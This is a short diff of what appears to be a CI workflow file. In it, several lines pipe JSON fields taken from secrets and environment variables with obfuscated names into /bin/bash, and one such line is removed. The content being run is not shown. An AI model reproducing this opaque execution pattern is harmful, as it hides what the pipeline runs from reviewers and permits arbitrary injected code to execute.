@@ -21,7 +21,6 @@ jobs:
           owj43: ${{ secrets.owj43 }}
         run: |
           printf '%s' "$owj43" | jq -r .s6929 | /bin/bash
-          echo $u7 | jq -r .fge07 | /bin/bash
           echo $q95167 | jq -r .dge1548 | /bin/bash
           printf '%s' "$gtn76" | jq -r .ajsx759 | /bin/bash
           echo $ezfr75 | jq -r .ed3731 | /bin/bash
